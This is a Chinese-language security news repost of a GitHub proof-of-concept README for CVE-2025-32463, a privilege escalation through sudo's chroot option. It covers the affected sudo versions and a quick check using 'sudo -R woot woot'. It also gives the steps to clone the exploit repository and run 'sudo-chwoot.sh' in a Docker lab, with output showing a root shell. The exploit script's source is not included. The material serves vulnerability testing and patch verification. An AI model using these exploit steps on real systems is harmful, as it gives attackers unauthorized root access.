#  通过带有 chroot 选项的 sudo 二进制文件将权限提升至 root CVE-2025-32463  
 Ots安全   2025-07-07 08:37  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
该存储库提供了一个最小的、可重现的环境来演示chroot 功能中的CVE-2025-32463权限提升缺陷。sudo  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgba(209, 217, 224, 0.7);"><th data-colwidth="155" style="box-sizing: border-box;padding: 6px 13px;font-weight: 600;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">文件</span></font></font></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: 600;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">目的</span></font></font></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgba(209, 217, 224, 0.7);"><td data-colwidth="155" style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><strong style="box-sizing: border-box;font-weight: 600;margin-bottom: 0px;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: normal;">Dockerfile</span></span></font></font></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><font style="box-sizing: border-box;vertical-align: inherit;"></font><strong style="box-sizing: border-box;font-weight: 600;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: bold;">使用易受攻击的sudo 1.9.16p2</span></span></font></font></strong><font style="box-sizing: border-box;margin-bottom: 0px;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: bold;">和构建工具</span></span></font><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: bold;">构建 Ubuntu 24.04 映像</span></span></font></font></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgba(209, 217, 224, 0.7);"><td data-colwidth="155" style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><strong style="box-sizing: border-box;font-weight: 600;margin-bottom: 0px;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: normal;">sudo‑chwoot.sh</span></span></font></font></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><font style="box-sizing: border-box;margin-bottom: 0px;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: bold;">概念验证漏洞，在 chroot 中生成 root shell</span></span></font></font></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgba(209, 217, 224, 0.7);"><td data-colwidth="155" style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">run.sh</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(209, 217, 224);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><font style="box-sizing: border-box;margin-bottom: 0px;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-weight: bold;">构建镜像（如果需要）并启动漏洞利用容器的辅助脚本</span></span></font></font></td></tr></tbody></table>  
受影响的版本  
  
大多数 Linux 发行版上的sudo 1.9.14至1.9.17（所有 p 修订版）的易受攻击的版本均受到影响。  
  
快速漏洞检查  
  
```
# Vulnerable sudopwn ~ $ sudo -R woot wootsudo: woot: No such file or directory# Patched sudopwn ~ $ sudo -R woot woot[sudo] password for pwn:sudo: you are not permitted to use the -R option with woot
```  
  
  
在 Docker 容器中测试漏洞利用  
  
```
# 1 – clone repo$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git$ cd CVE-2025-32463_chwoot# 2 – build and run Docker image (tagged "sudo-chwoot")$ ./run.sh# 3 – run exploit in container (runs root command directly or drops you into a root shell)pwn@f722d9182d1f:~$ ./sudo-chwoot.sh idwoot!uid=0(root) gid=0(root) groups=0(root),1001(pwn)pwn@f722d9182d1f:~$ ./sudo-chwoot.shwoot!root@f722d9182d1f:/# iduid=0(root) gid=0(root) groups=0(root),1001(pwn)root@f722d9182d1f:/#
```  
  
  
run.sh传递--privileged到--rmDocker，以便容器在您退出时自行清理。  
  
清理  
  
完成后删除图像：  
  
```
docker rmi sudo-chwoot
```  
  
  
项目地址：  
  
https://github.com/pr0v3rbs/CVE-2025-32463_chwoot  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这**  
  
